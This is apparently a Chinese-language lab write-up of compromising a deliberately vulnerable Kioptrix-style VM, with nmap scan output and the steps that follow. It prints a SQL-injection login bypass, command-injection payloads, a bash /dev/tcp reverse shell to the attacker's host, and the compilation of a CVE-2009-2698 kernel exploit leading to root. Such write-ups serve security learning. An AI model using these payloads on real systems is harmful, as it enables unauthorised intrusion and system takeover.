# 1. 信息收集

> nmap

~~~shell
# ip探测

# Nmap 7.92 scan initiated Thu May  5 00:55:05 2022 as: nmap -sn -oN pingscan.txt 192.168.1.0/24
Nmap scan report for 192.168.1.1
Host is up (0.0023s latency).
MAC Address: FC:61:E9:D9:E7:AC (Fiberhome Telecommunication Technologies)
Nmap scan report for 192.168.1.3
Host is up (0.00055s latency).
MAC Address: A4:5E:60:C2:D9:0B (Apple)
Nmap scan report for 192.168.1.101
Host is up (0.00087s latency).
MAC Address: 00:0C:29:C5:81:9A (VMware)
Nmap scan report for 192.168.1.7
Host is up.
# Nmap done at Thu May  5 00:55:07 2022 -- 256 IP addresses (4 hosts up) scanned in 2.03 seconds
发现主机：192.168.1.101

# 操作系统、端口、常用漏洞探测
# Nmap 7.92 scan initiated Thu May  5 00:56:12 2022 as: nmap -n -v -sV -A -sC -T5 -p- -Pn -o scan101.txt 192.168.1.101
Nmap scan report for 192.168.1.101
Host is up (0.00099s latency).
Not shown: 65528 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
|_sshv1: Server supports SSHv1
| ssh-hostkey:
|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.0.52 (CentOS)
111/tcp  open  rpcbind  2 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            707/udp   status
|_  100024  1            710/tcp   status
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|_    SSL2_DES_64_CBC_WITH_MD5
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_ssl-date: 2022-05-05T01:43:12+00:00; -3h13m33s from scanner time.
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: md5WithRSAEncryption
| Not valid before: 2009-10-08T00:10:47
| Not valid after:  2010-10-08T00:10:47
| MD5:   01de 29f9 fbfb 2eb2 beaf e624 3157 090f
|_SHA-1: 560c 9196 6506 fb0f fb81 66b1 ded3 ac11 2ed4 808a
|_http-server-header: Apache/2.0.52 (CentOS)
631/tcp  open  ipp      CUPS 1.1
|_http-title: 403 Forbidden
| http-methods:
|   Supported Methods: GET HEAD OPTIONS POST PUT
|_  Potentially risky methods: PUT
710/tcp  open  status   1 (RPC #100024)
3306/tcp open  mysql    MySQL (unauthorized)
MAC Address: 00:0C:29:C5:81:9A (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.30
Uptime guess: 0.019 days (since Thu May  5 00:29:15 2022)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=202 (Good luck!)
IP ID Sequence Generation: All zeros

Host script results:
|_clock-skew: -3h13m33s

TRACEROUTE
HOP RTT     ADDRESS
1   0.99 ms 192.168.1.101

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu May  5 00:56:45 2022 -- 1 IP address (1 host up) scanned in 33.63 seconds
~~~

> web服务

访问首页访问源代码，发现一个登录页面：

<img src="https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-23/images/1.png" style="zoom:50%" />


~~~html
<html>
<body>
<form method="post" name="frmLogin" id="frmLogin" action="index.php">
	<table width="300" border="1" align="center" cellpadding="2" cellspacing="2">
		<tr>
			<td colspan='2' align='center'>
			<b>Remote System Administration Login</b>
			</td>
		</tr>
		<tr>
			<td width="150">Username</td>
			<td><input name="uname" type="text"></td>
		</tr>
		<tr>
			<td width="150">Password</td>
			<td>
			<input name="psw" type="password">
			</td>
		</tr>
		<tr>
			<td colspan="2" align="center">
			<input type="submit" name="btnLogin" value="Login">
			</td>
		</tr>
	</table>
</form>

<!-- Start of HTML when logged in as Administator -->
</body>
</html>
~~~

`通过分析源代码，发现用户名大概率是administrator,但是没有密码信息，尝试万能密码：`

> `payload: `
>
> `uname:administrator' or '1'='1`
>
> `psw:' or '1'='1`

<img src="https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-23/images/2.png" style="zoom:50%" />

`payload:127.0.0.1;pwd;whoami;`

<img src="https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-23/images/3.png" style="zoom:50%" />

寻找写权限的目录：

<img src="https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-23/images/4.png" style="zoom:50%" />

> 弹shell

`payload:`

`192.168.1.7;bash -c 'exec bash -i &>/dev/tcp/192.168.1.7/8888 <&1';`

<img src="https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-23/images/5.png" style="zoom:50%" />



> 提权

我试了1397.c,但是提权不成功
~~~bash
bash-3.00$ gcc -o 0x82-CVE-2009-2698 9542.c && ./0x82-CVE-2009-2698
9542.c:109:28: warning: no newline at end of file
sh: no job control in this shell
sh-3.00# id
uid=0(root) gid=0(root) groups=48(apache)
bash-3.00# passwd root
New UNIX password: 123456
BAD PASSWORD: it is too simplistic/systematic
Retype new UNIX password: 123456
Changing password for user root.
passwd: all authentication tokens updated successfully.
~~~

<img src="https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-23/images/6.png" style="zoom:50%" />
